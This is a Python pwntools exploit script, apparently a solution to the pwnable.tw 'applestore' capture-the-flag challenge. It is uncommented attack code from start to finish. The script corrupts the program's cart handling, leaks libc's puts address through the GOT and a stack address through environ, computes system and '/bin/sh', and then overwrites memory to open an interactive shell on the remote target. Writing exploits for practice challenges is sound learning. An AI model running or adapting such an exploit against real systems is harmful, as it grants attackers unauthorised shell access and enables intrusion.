from pwn import *
#target=process('./applestore',env={"LD_PRELOAD":"./libc_32.so.6"})
target=remote('chall.pwnable.tw',10104)
#context.log_level='DEBUG'
elf=ELF('./applestore')
libc=ELF('./libc_32.so.6')

def sla(string,val):
	target.sendlineafter(string,val)
def sa(string,val):
	target.sendafter(string,val)

def add(option):
	sla("> ",str(2))
	sla("> ",str(option))

def delete(option):
	sla("> ",str(3))
	sla("> ",str(option))
	
def cart(data='y'):
	sla("> ",str(4))
	sla("> ",data)

def checkout():
	sla("> ",str(5))
	sla("> ",'y')

for i in range(20):
	add(2)

for i in range(6):
	add(1)

checkout()
#pause()
payload='y '+p32(elf.got["puts"])+p32(0x0)*2
cart(payload)
target.recvuntil("27: ")
libc_puts=u32(target.recv(4))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh").next()
print(hex(libc_base))

payload='y '+p32(libc_base+libc.symbols["environ"])+p32(0x0)*2
cart(payload)
target.recvuntil("27: ")
stack_leak=u32(target.recv(4))
print(hex(stack_leak))

sla("> ",str(3))
sla("> ",str(27)+p32(libc_puts)+"A"*0x4+p32(stack_leak-0xe4)+p32(stack_leak-0xcc))
sla("> ",str(6)+" "+p32(0xdeadbeef)+p32(libc_system)+p32(0xdeadbeef)+p32(libc_binsh))

target.interactive()
